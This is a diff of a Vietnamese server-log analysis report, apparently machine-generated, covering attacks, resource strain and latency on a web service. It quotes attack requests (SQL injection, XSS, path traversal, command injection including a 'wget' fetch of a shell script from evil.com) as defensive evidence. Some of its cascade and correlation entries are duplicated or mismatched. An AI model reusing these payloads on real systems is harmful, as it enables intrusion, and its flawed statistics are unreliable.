@@ -1,141 +1,160 @@
 # 📋 BÁO CÁO PHÂN TÍCH LOG SERVER
-**Thời gian tạo báo cáo:** 2026-03-17 21:40:32
+**Thời gian tạo báo cáo:** 2026-04-14 09:57:37
 **Hệ thống:** Hệ thống Phân Tích Log Đa Tác Tử (Autogen Framework)
 
 ---
 
 ## 1. 🛡️ Phân Tích Bảo Mật
 
-[DU_LIEU_TU_LOG]
-- Tổng số sự kiện tấn công (chỉ tính evidence chính): 17
-- Số dòng detection/cảnh báo (tách riêng): 13
+**[DU_LIEU_TU_LOG]**
+- Tổng số sự kiện tấn công (chỉ tính evidence chính): 21
+- Số dòng detection/cảnh báo (tách riêng): 17
 - Số dòng mitigation rõ ràng (tách riêng): 2
 - Số request bị từ chối (401/403) trong evidence (nếu tool có): 6
 - Loại tấn công xác nhận từ primary evidence:
-  + SQL Injection: 2
-  + Command Injection: 2
-  + XSS: 1
-  + Path Traversal / LFI: 1
-  + Brute-force: 9
-  + Unauthorized/Forced browsing: 4
+  - Brute-force: 13
+  - SQL Injection: 2
+  - Command Injection: 2
+  - Unauthorized access: 4
+  - XSS: 1
+  - Path Traversal: 1
 - Loại tấn công chỉ có trong detection-context, không tính vào tổng:
-  - NoSQL Injection: 2
-  - LDAP Injection: 1
+  - NoSQL Injection: 2 (từ detection logs: "NoSQL Injection attempt detected from IP 10.0.0.77")
+  - LDAP Injection: 1 (từ detection-context targets có /api/auth/ldap)
   - DDoS / Flooding: 0
   - Sensitive Data Exposure: 0
 - IP đáng ngờ từ evidence:
-  + 10.0.0.55 (liên quan 7 sự kiện, denied 3 lần)
-  + 10.0.0.88 [BLOCKED] (liên quan 6 sự kiện)
-  + 10.0.0.99 [WATCHLIST] (liên quan 4 sự kiện, denied 3 lần)
+  - 10.0.0.55 (7 evidence events)
+  - 10.0.0.88 [BLOCKED] (7 evidence events)
+  - 10.0.0.99 [WATCHLIST] (4 evidence events)
 - Dịch vụ/endpoint bị nhắm:
-  + /../../etc/passwd
-  + /.env
-  + /.git/config
-  + /api/auth/ldap
-  + /api/exec
-  + /api/login
-  + /api/query
-  + /api/search
-  + /api/users/search
+  - /api/search
+  - /api/login
+  - /api/exec
+  - /../../etc/passwd
+  - /.env
+  - /.git/config
 - Mục tiêu trong detection-context, không tính vào tổng:
-  + /api/auth/ldap
-  + /api/query
-  + /api/users/search
-- Mốc thời gian tấn công: 2026-03-13 08:02:00 → 2026-03-13 08:14:58
+  - IP 10.0.0.77: /api/auth/ldap, /api/query, /api/users/search
+- Mốc thời gian tấn công: 2026-03-13 08:02:00 → 2026-03-13 08:21:45
 - Bằng chứng từ log:
-  1. [2026-03-13 08:02:00] WARNING [WebServer] GET /api/search?q=SELECT+*+FROM+users+WHERE+1%3D1 400 5ms 10.0.0.55 - Suspicious query parameter (SQLi)
-  2. [2026-03-13 08:02:05] WARNING [WebServer] GET /api/search?q=%3Cscript%3Ealert('xss')%3C/script%3E 400 3ms 10.0.0.55 - Suspicious query parameter (XSS)
-  3. [2026-03-13 08:02:10] WARNING [WebServer] GET /../../etc/passwd 403 2ms 10.0.0.55 - Path traversal blocked
-  4. [2026-03-13 08:03:00] WARNING [AuthService] Failed login attempt for user 'admin' from 10.0.0.88 (attempt 1/5)
-  5. [2026-03-13 08:03:09] ERROR [AuthService] Account 'admin' locked due to 5 consecutive failed login attempts from 10.0.0.88
-  6. [2026-03-13 08:07:00] WARNING [WebServer] GET /api/search?q='+OR+'1'%3D'1'+--+ 400 4ms 10.0.0.99 - Suspicious query parameter (SQLi)
-  7. [2026-03-13 08:07:05] WARNING [WebServer] POST /api/login 401 15ms 10.0.0.99 - Invalid credentials (Brute-force)
-  8. [2026-03-13 08:14:30] WARNING [WebServer] GET /api/exec?cmd=;cat+/etc/passwd 400 3ms 10.0.0.55 - Suspicious parameter (Command Injection)
-  9. [2026-03-13 08:14:35] WARNING [WebServer] POST /api/exec 400 2ms 10.0.0.55 - Command execution attempt: "|wget http://evil.com/shell.sh"
-  10. [2026-03-13 08:14:55] WARNING [WebServer] GET /.env 403 1ms 10.0.0.55 - Forbidden
-  11. [2026-03-13 08:14:58] WARNING [WebServer] GET /.git/config 403 1ms 10.0.0.55 - Forbidden
-  (và các dòng brute-force, detection khác...)
+  1. [2026-03-13 08:02:00] SQL Injection: GET /api/search?q=SELECT+*+FROM+users+WHERE+1%3D1 400 5ms 10.0.0.55
+  2. [2026-03-13 08:02:05] XSS: GET /api/search?q=%3Cscript%3Ealert('xss')%3C/script%3E 400 3ms 10.0.0.55
+  3. [2026-03-13 08:02:10] Path Traversal: GET /../../etc/passwd 403 2ms 10.0.0.55
+  4. [2026-03-13 08:03:00-08] Brute-force: 5 failed login attempts for 'admin' from 10.0.0.88
+  5. [2026-03-13 08:03:09] Account 'admin' locked due to 5 consecutive failed login attempts
+  6. [2026-03-13 08:07:00] SQL Injection: GET /api/search?q='+OR+'1'%3D'1'+--+ 400 4ms 10.0.0.99
+  7. [2026-03-13 08:07:05-07] Brute-force: 3 failed login attempts from 10.0.0.99
+  8. [2026-03-13 08:14:30] Command Injection: GET /api/exec?cmd=;cat+/etc/passwd 400 3ms 10.0.0.55
+  9. [2026-03-13 08:14:35] Command Injection: POST /api/exec 400 2ms 10.0.0.55
+  10. [2026-03-13 08:14:55] Unauthorized access: GET /.env 403 1ms 10.0.0.55
+  11. [2026-03-13 08:14:58] Unauthorized access: GET /.git/config 403 1ms 10.0.0.55
+  12. [2026-03-13 08:16:15-21:45] Brute-force: Multiple failed login attempts for 'deploy' from various IPs
 
-[SUY_LUAN]
-- Đánh giá rủi ro: RẤT CAO – Nhiều sự kiện tấn công nghiêm trọng (SQLi, Command Injection, Brute-force, Path Traversal, XSS, Unauthorized access) với nhiều IP nguy cơ cao, có dấu hiệu tấn công tự động và khai thác lỗ hổng thực tế. Một số IP đã bị block/watchlist nhưng vẫn còn IP nguy hiểm chưa bị chặn rõ ràng.
+**[SUY_LUAN]**
+- Đánh giá rủi ro: RẤT CAO - hệ thống đang bị tấn công đa dạng từ nhiều IP với nhiều kỹ thuật khác nhau
 - Ghi chú / quy tắc đếm:
-  + Tổng số sự kiện tấn công chỉ tính các evidence event, không cộng detection/alert/mitigation log.
-  + Detection-context counts (NoSQL Injection: 2, LDAP Injection: 1) được xác định từ detection logs và target endpoints, không tính vào tổng evidence.
-  + Đã giữ đủ các endpoint detection-context: /api/query, /api/users/search, /api/auth/ldap.
-  + Không có dấu hiệu DDoS/Flooding hoặc Sensitive Data Exposure trong detection-context.
-  + Không suy ra đã block chỉ từ 401/403, chỉ ghi nhận block khi log ghi rõ.
+  - Primary evidence events (21) chỉ tính các dòng log trực tiếp ghi nhận hành vi tấn công
+  - Detection/alert logs (17) và mitigation logs (2) được tách riêng, không cộng vào tổng
+  - NoSQL Injection (2) và LDAP Injection (1) chỉ xuất hiện trong detection-context, không có trong primary evidence
+  - IP 10.0.0.88 đã bị blocklist, IP 10.0.0.99 đã bị watchlist
+  - Các request 401/403 chỉ cho thấy request bị từ chối, không tự động chứng minh có blocklist/firewall action nếu log không ghi rõ
 
 ---
 
 ## 2. 🏥 Phân Tích Sức Khỏe Hệ Thống
 
-[DU_LIEU_TU_LOG]
-- Trạng thái sức khỏe tổng thể: Hệ thống có nhiều dấu hiệu bất ổn nghiêm trọng, xuất hiện đồng thời lỗi tài nguyên, lỗi dịch vụ và các sự kiện bảo mật nguy hiểm.
-- Sử dụng CPU: KHÔNG ĐỦ DỮ LIỆU CỤ THỂ, nhưng có cảnh báo vượt ngưỡng 90% (theo log: [2026-03-13 08:04:11] [SystemMonitor] CPU Usage exceeded 90% threshold!)
-- Sử dụng bộ nhớ: KHÔNG ĐỦ DỮ LIỆU CỤ THỂ, nhưng có cảnh báo sử dụng bộ nhớ lên tới 96% (theo log: [2026-03-13 08:08:05] [SystemMonitor] Memory usage: 96% - approaching system limit!)
-- Sử dụng đĩa: KHÔNG ĐỦ DỮ LIỆU
-- Cảnh báo sức khỏe: 43 dòng WARNING | Ví dụ: cảnh báo brute-force, cảnh báo truy cập trái phép, cảnh báo query nguy hiểm, cảnh báo tài nguyên cao.
-- Sự kiện nghiêm trọng: 4 dòng CRITICAL | Ví dụ: tấn công brute-force, command injection, CPU vượt ngưỡng, RAM gần đầy.
-- Vấn đề dịch vụ: 10 dòng ERROR | Ví dụ: Database connection pool exhausted, WebServer trả về 503/500, PaymentService timeout, ReportService OutOfMemoryError.
-- Sự kiện hệ thống quan trọng: 14 lỗi tổng hợp (10 ERROR + 4 CRITICAL) | Bao gồm cả lỗi dịch vụ và sự kiện bảo mật nghiêm trọng.
-- Phân bố mã HTTP (top 5): 200: 31, 400: 8, 201: 3, 403: 3, 500: 3, 401: 3, 503: 2, 413: 1
+**[DU_LIEU_TU_LOG]**
+- Trạng thái sức khỏe tổng thể: NGUY HIỂM 🔴
+- Sử dụng CPU: Min 12%, Max 92%, Trung bình 54.6%, Số lần đo 11
+- Sử dụng bộ nhớ: Min 45%, Max 96%, Trung bình 67.4%, Số lần đo 12
+- Sử dụng đĩa: Min 62%, Max 86%, Trung bình 75.7%, Số lần đo 11
+- Cảnh báo sức khỏe: 11 | ví dụ: CPU Usage: 78%, Memory: 72%, Disk: 62%; Memory usage exceeded 85% threshold!; Disk I/O latency: 250ms (threshold: 100ms); Disk usage exceeded 80% threshold!
+- Sự kiện nghiêm trọng: 2 | ví dụ: CPU Usage exceeded 90% threshold!; Memory usage: 96% - approaching system limit!
+- Vấn đề dịch vụ: 20 | ví dụ: Database connection pool exhausted - max connections reached (100/100); WebServer GET /api/users 503 Service Unavailable; Payment processing failed: timeout connecting to payment gateway; ReportService Failed to generate report: OutOfMemoryError; AuthService Account 'admin' locked due to 5 consecutive failed login attempts
+- Sự kiện hệ thống quan trọng: 2 | ví dụ: Memory cleanup completed - freed 1.2GB, current usage: 68%; System summary - Uptime: 15m 29s, Total requests: 85, Errors: 9, Warnings: 22
+- Phân bố mã HTTP (nếu có từ tool): KHÔNG CÓ TRONG OUTPUT NÀY
+
+**[SUY_LUAN]**
+- Diễn giải sức khỏe hệ thống: Hệ thống đang trong tình trạng nguy hiểm với nhiều vấn đề nghiêm trọng. CPU đạt đỉnh 92% (vượt ngưỡng 90%), bộ nhớ đạt 96% (gần giới hạn hệ thống), và đĩa đạt 86% (vượt ngưỡng 80%). Có 20 vấn đề dịch vụ bao gồm database connection pool exhausted, service unavailable (503), internal server errors (500), và OutOfMemoryError. Hệ thống cũng ghi nhận 11 cảnh báo sức khỏe và 2 sự kiện nghiêm trọng. Tình trạng này cho thấy hệ thống đang quá tải và cần can thiệp khẩn cấp.
 
 ---
 
 ## 3. 📈 Phân Tích Hiệu Suất
 
-[DU_LIEU_TU_LOG]
-- Tổng số request HTTP: 54
-- Tóm tắt thời gian phản hồi: Trung bình 352.6ms, Min 1ms, Max 3200ms, P95 2100ms, P99 3200ms
-- Tỷ lệ lỗi: 20/54 (37.0%) các request trả về mã lỗi HTTP 4xx/5xx
-- Số request chậm: 6 request có thời gian phản hồi > 1000ms
-- Endpoint chậm:
-/api/reports/annual: 3200.0ms
-/api/recommendations: 2800.0ms
-/api/payment: 2075.0ms
-/api/reports: 1520.0ms
-- Endpoint có độ trễ trung bình cao nhất:
-/api/reports/annual: 3200.0ms
-/api/recommendations: 2800.0ms
-/api/payment: 2075.0ms
-/api/reports: 1520.0ms
-/api/checkout: 680.0ms
-- Thông lượng: Đỉnh điểm đạt 10 requests/phút lúc 2026-03-13 08:14
+**[DU_LIEU_TU_LOG]**
+- Tổng số request HTTP: 82
+- Tóm tắt thời gian phản hồi: Trung bình 620.4ms, Min 1ms, Max 3200ms, P95 2317ms, P99 3200ms
+- Tỷ lệ lỗi: 29.3% (24/82 HTTP 4xx/5xx)
+- Số request chậm: 14 (response time > 1000ms)
+- Endpoint chậm: /api/reports/annual (3200.0ms), /api/recommendations (2800.0ms), /api/reports/monthly (2609.0ms), /api/payment (2075.0ms), /api/reports/export (1552.8ms), /api/reports (1520.0ms)
+- Endpoint có độ trễ trung bình cao nhất: /api/reports/annual (3200.0ms)
+- Thông lượng: Peak 10 requests/phút lúc 2026-03-13 08:14
 - Metric summary từ server: Tổng số request 85, Thời gian phản hồi trung bình 287ms, Tổng lỗi hệ thống 9, Tổng cảnh báo hệ thống 22
-- Phân bố mã HTTP (top 5): 200: 31, 400: 8, 201: 3, 403: 3, 500: 3, 401: 3, 503: 2, 413: 1
-- Error requests tiêu biểu:
-  + [2026-03-13 08:01:11] GET /api/users -> 503 (5ms, IP: 192.168.1.15)
-  + [2026-03-13 08:05:00] POST /api/payment -> 500 (2100ms, IP: 192.168.1.25)
-  + [2026-03-13 08:14:30] GET /api/exec?cmd=;cat+/etc/passwd -> 400 (3ms, IP: 10.0.0.55)
+- Phân bố mã HTTP (nếu có từ tool): 200 (50), 201 (8), 400 (8), 500 (7), 403 (3), 401 (3), 503 (2), 413 (1)
+- Error requests tiêu biểu (nếu có từ tool):
+  1. [2026-03-13 08:01:11] GET /api/users -> 503 (5ms, IP: 192.168.1.15)
+  2. [2026-03-13 08:05:00] POST /api/payment -> 500 (2100ms, IP: 192.168.1.25)
+  3. [2026-03-13 08:17:20] GET /api/reports/export -> 500 (2317ms, IP: 10.0.0.55)
+- Log activity (non-HTTP, nếu có từ tool): KHÔNG CÓ DỮ LIỆU
 
-[QUY_TAC_DO_LUONG]
-- Phạm vi / phương pháp đo: Chỉ dựa trên các HTTP entry parse được từ log, các percentile tính theo nearest-rank, throughput dựa trên số request thực tế từng phút.
-- Khác biệt giữa lỗi HTTP raw và summary errors: Raw HTTP 4xx/5xx là lỗi trả về cho client, còn 'System summary - errors' là tổng hợp lỗi hệ thống/app, không phải đếm lại từng HTTP error response.
+**[QUY_TAC_DO_LUONG]**
+- Phạm vi / phương pháp đo: Throughput, error rate và response-time metrics chỉ dựa trên HTTP entries parse được. Percentile dùng nearest-rank trên tập response times quan sát trực tiếp. Slow request = 1 request có response time > 1000ms. Slow endpoint = average response time của endpoint >= 1000ms.
+- Khác biệt giữa lỗi HTTP raw và summary errors: Raw HTTP 4xx/5xx responses (24) và 'System summary - Errors' (9) là 2 metric khác nhau; summary line có vẻ là counter tổng hợp cấp hệ thống/app, không phải đếm lại từng HTTP error response.
+- KHÔNG ĐỦ DỮ LIỆU:
 
---- TUONG QUAN & LUU LUONG ---
-- Chuỗi lỗi liên tiếp: 4 cascade | ví dụ:
-  + Cascade #1: [2026-03-13 08:01:10] [Database] Connection pool exhausted - max connections reached (100/100) → [2026-03-13 08:01:11] [WebServer] GET /api/users 503 → [2026-03-13 08:01:12] [WebServer] POST /api/orders 503
-  + Cascade #2: [2026-03-13 08:03:09] [AuthService] Account 'admin' locked do 5 lần login fail từ 10.0.0.88 → [2026-03-13 08:03:10] [SecurityModule] Brute-force attack detected
-  + Cascade #3: [2026-03-13 08:05:00] [WebServer] POST /api/payment 500 → [2026-03-13 08:05:01] [PaymentService] Payment processing failed → [2026-03-13 08:05:05] [WebServer] POST /api/payment 500 → [2026-03-13 08:05:06] [PaymentService] Payment processing failed
-  + Cascade #4: [2026-03-13 08:08:00] [WebServer] GET /api/reports/export 500 → [2026-03-13 08:08:01] [ReportService] Failed to generate report: OutOfMemoryError → [2026-03-13 08:08:05] [SystemMonitor] Memory usage: 96%
-- Liên hệ theo thời gian giữa đợt tấn công và tác động: 2 candidate links | ví dụ:
-  + burst ip=10.0.0.88 (brute-force, 6 events, 2026-03-13 08:03:00 → 08:03:09) → Impact gần nhất sau 62s: [2026-03-13 08:04:11] [SystemMonitor] CPU Usage exceeded 90%
-  + burst ip=10.0.0.99 (brute-force + sql_injection, 4 events, 2026-03-13 08:07:00 → 08:07:07) → Impact gần nhất sau 53s: [2026-03-13 08:08:00] [WebServer] GET /api/reports/export 500
-- Liên hệ theo thời gian giữa tài nguyên và sự kiện: 4 candidate links | ví dụ:
-  + DB_POOL event (Connection pool exhausted) → Error gần nhất sau 1s: [2026-03-13 08:01:11] [WebServer] GET /api/users 503
-  + OOM event (Failed to generate report: OutOfMemoryError) → Error gần nhất sau 4s: [2026-03-13 08:08:05] [SystemMonitor] Memory usage: 96%
+**[TUONG_QUAN_&_LUU_LUONG]**
+**[DU_LIEU_TU_LOG]**
+- Chuỗi lỗi liên tiếp: 8 | ví dụ:
+  1. Database connection pool exhausted → WebServer 503 errors (3 events)
+  2. AuthService account lock → SecurityModule brute-force detection (2 events)
+  3. WebServer payment errors → PaymentService timeout failures (4 events)
+  4. WebServer report export error → ReportService OutOfMemoryError → SystemMonitor memory 96% (3 events)
+  5. AuthService token validation → Database deadlock → PaymentService gateway 502 → SecurityModule credential stuffing → WebServer report export error (5 events)
+  6. AuthService token validation → Database deadlock → PaymentService gateway 502 → SecurityModule credential stuffing → WebServer report export error (5 events)
+  7. AuthService token validation → Database deadlock → PaymentService gateway 502 → SecurityModule credential stuffing → WebServer report export error (5 events)
+  8. AuthService token validation → Database deadlock → PaymentService gateway 502 → SecurityModule credential stuffing → WebServer report export error (5 events)
+
+- Liên hệ theo thời gian giữa đợt tấn công và tác động: 7 | ví dụ:
+  1. Burst IP 10.0.0.88 (brute-force, 6 events) → CPU Usage exceeded 90% threshold! (62s sau)
+  2. Burst IP 10.0.0.99 (brute-force, sql_injection, 4 events) → WebServer GET /api/reports/export 500 error (53s sau)
+  3. Burst IP 10.0.0.55 (command_injection, unauthorized_access, 4 events) → Database deadlock (97s sau)
+  4. Burst IP N/A (brute-force, 1 event) → Database deadlock (20s sau)
+  5. Burst IP 10.0.0.88 (brute-force, 1 event) → Database deadlock (20s sau)
+  6. Burst IP N/A (brute-force, 1 event) → Database deadlock (20s sau)
+  7. Burst IP N/A (brute-force, 1 event) → Database deadlock (20s sau)
+
+- Liên hệ theo thời gian giữa tài nguyên và sự kiện: 8 | ví dụ:
+  1. DB_POOL event (Connection pool exhausted) → WebServer 503 error (1s sau)
+  2. CPU event (92%) → SystemMonitor CPU threshold exceeded (1s sau)
+  3. Memory event (88%) → SystemMonitor CPU threshold exceeded (1s sau)
+  4. OOM event (OutOfMemoryError) → SystemMonitor memory 96% (4s sau)
+  5. Memory event (94%) → WebServer report export error (5s sau)
+  6. Disk event (82%) → WebServer report export error (5s sau)
+  7. CPU event (86%) → WebServer report export error (5s sau)
+  8. Disk event (86%) → WebServer report export error (5s sau)
+
 - Bất thường lưu lượng:
-  + Đỉnh lưu lượng: 10 requests/phút lúc 2026-03-13 08:14
-  + Trung bình: 4.2 requests/phút
-  + Tỷ lệ lỗi HTTP 4xx/5xx: 37.0% (20/54 request)
-  + 6 request chậm (>1000ms), nhiều endpoint có độ trễ trung bình cao: /api/reports/annual (3200ms), /api/recommendations (2800ms), /api/payment (2075ms), /api/reports (1520ms)
+  - Tổng HTTP requests: 82
+  - IP duy nhất: 10 (6 internal, 4 external)
+  - Thông lượng trung bình: 4.6 requests/phút
+  - Thông lượng đỉnh: 10 requests/phút lúc 2026-03-13 08:14
+  - Phân bố theo phút: 08:00 (6), 08:01 (5), 08:02 (3), 08:04 (5), 08:05 (4), 08:06 (3), 08:07 (4), 08:08 (2), 08:09 (5), 08:12 (4), 08:13 (2), 08:14 (10), 08:15 (6), 08:17 (6), 08:19 (6), 08:21 (6), 08:22 (2), 08:23 (3)
+
 - Mẫu hình lưu lượng của IP đáng ngờ:
-  + 10.0.0.55: 7 request, 7 lỗi, review status, liên quan nhiều đến SQLi, XSS, path traversal, command injection, unauthorized access
-  + 10.0.0.99: 4 request, 4 lỗi, review status, liên quan brute-force, sql_injection
-  + 10.0.0.77: 3 request, 3 lỗi, review status, detection-context liên quan NoSQL injection
+  - 10.0.0.55: 10 requests, 8 errors (80% error rate), REVIEW status
+  - 10.0.0.99: 7 requests, 5 errors (71% error rate), REVIEW status
+  - 10.0.0.77: 3 requests, 3 errors (100% error rate), REVIEW status
+  - 10.0.0.88: 3 requests, 0 errors (0% error rate), OK status
+
 - Quan hệ theo mốc thời gian:
-  + Các chuỗi lỗi và đợt tấn công xuất hiện gần nhau theo thời gian với các sự kiện tài nguyên và lỗi dịch vụ, gợi ý heuristic về khả năng ảnh hưởng lẫn nhau.
-- KHÔNG ĐỦ DỮ LIỆU: Không có.
+  - Security bursts grouped by IP/time (≤30s gap): 8
+  - Error cascades observed (≤30s gap): 8
+  - Resource → nearest error candidate links (≤120s): 8
+  - Security burst → nearest impact candidate links (≤120s): 7
+
+**[SUY_LUAN]**
+- Diễn giải tương quan: Có 8 chuỗi lỗi liên tiếp được quan sát, với AuthService xuất hiện sớm nhất trong 5 cascade, WebServer trong 2 cascade, và Database trong 1 cascade. Có 7 liên hệ theo thời gian gợi ý giữa các đợt tấn công bảo mật và tác động hệ thống, và 8 liên hệ theo thời gian gợi ý giữa sự kiện tài nguyên và lỗi. Lưu lượng có đỉnh 10 requests/phút lúc 08:14, với 3 IP external có tỷ lệ lỗi cao (80-100%) cần xem xét. Các liên kết này chỉ là candidate temporal links, không phải bằng chứng nhân quả.
 
 ---
 
